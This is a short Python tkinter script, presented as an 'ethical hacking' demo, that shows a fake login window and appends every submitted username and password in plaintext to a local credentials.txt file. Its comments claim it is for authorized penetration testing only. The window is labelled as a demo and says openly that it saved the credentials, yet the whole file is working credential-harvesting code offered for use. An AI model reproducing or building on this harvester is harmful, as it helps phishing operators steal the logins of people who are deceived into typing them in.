# Social Engineering Credential Harvester GUI
# Author: Sabaz Ali Khan (Ethical Hacker, Pakistan)
# Purpose: Educational demonstration of social engineering for authorized penetration testing
# Warning: Use only with explicit permission. Unauthorized use is illegal.

import tkinter as tk
from tkinter import messagebox
import os
import datetime

class CredentialHarvesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ethical Hacking Demo - Login Page")
        self.root.geometry("400x300")
        self.root.configure(bg="#f0f0f0")

        # Title Label
        tk.Label(root, text="Login Page (Demo)", font=("Arial", 16, "bold"), bg="#f0f0f0").pack(pady=20)

        # Username Field
        tk.Label(root, text="Username:", font=("Arial", 12), bg="#f0f0f0").pack()
        self.username_entry = tk.Entry(root, width=30, font=("Arial", 12))
        self.username_entry.pack(pady=5)

        # Password Field
        tk.Label(root, text="Password:", font=("Arial", 12), bg="#f0f0f0").pack()
        self.password_entry = tk.Entry(root, width=30, font=("Arial", 12), show="*")
        self.password_entry.pack(pady=5)

        # Submit Button
        tk.Button(root, text="Login", font=("Arial", 12), bg="#4CAF50", fg="white",
                  command=self.save_credentials).pack(pady=20)

        # Info Label
        tk.Label(root, text="Ethical Hacking Tool by Sabaz Ali Khan\nFor authorized use only",
                 font=("Arial", 10), bg="#f0f0f0", fg="#555").pack(pady=10)

    def save_credentials(self):
        username = self.username_entry.get()
        password = self.password_entry.get()

        if not username or not password:
            messagebox.showerror("Error", "Please enter both username and password!")
            return

        # Save credentials to file
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f"[{timestamp}] Username: {username} | Password: {password}\n"

        try:
            with open("credentials.txt", "a") as f:
                f.write(data)
            messagebox.showinfo("Success", "Credentials saved successfully!")
            self.username_entry.delete(0, tk.END)
            self.password_entry.delete(0, tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save credentials: {str(e)}")

def main():
    root = tk.Tk()
    app = CredentialHarvesterGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()